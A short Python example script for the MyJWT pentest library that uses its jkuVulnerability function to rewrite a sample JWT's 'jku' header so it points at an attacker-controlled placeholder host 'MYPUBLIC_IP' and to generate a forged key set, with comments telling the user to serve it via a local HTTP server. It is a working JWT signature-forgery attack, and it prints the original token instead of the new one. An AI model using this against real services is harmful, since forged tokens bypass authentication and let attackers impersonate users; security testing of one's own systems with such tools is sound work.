from MyJWT.vulnerabilities import jkuVulnerability

jwt = (
    "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9wdGwtMTc5OTRmNTAtMzI5NTg0MTYubGliY3VybC5zby8ud2VsbC1"
    "rbm93bi8vandrcy5qc29uIn0.eyJ1c2VyIjoiYSJ9.e1oZ73Q95aYPcRfulEY--beuGEV2tE1W_FGHtH1ZlevC76lBVqbdM5PY1v6quuJWRtN"
    "LwqDbUdydAH4lubgE0pwix-A7LqcD-b-0mNQkt9jXqBYCYBsZtGnvBFB9qHoK_CI39qLku1rOWkcEOcJYMSJFfxipImBb_AwoiXv-wmnpchTO"
    "AY_PFOtXVXKHkoGQtEaMKfnRBXHAgyEAcqHCqvljWuMmdKVpyGNVaQBnKCEKkGyYLpdpL2UIZ3XNYy96JcGpm6LHvIXm6rEOkWoJl2j_07xVs"
    "M2S__QzllRw_qezS5rzuYlRz-0j0nP_S5gSRcdrR4yNtSO3ivue5mR-RQ"
)

newJwt = jkuVulnerability(jwt=jwt, url="MYPUBLIC_IP")
# optionals param file, pem (check documentation).
# this function will create a new json file for your new jwks (named: jwk-python.json)
print(jwt)
# don't forget to create a server before send your new jwt
# like python -m http.server --bind MYPUBLIC_IP 8080
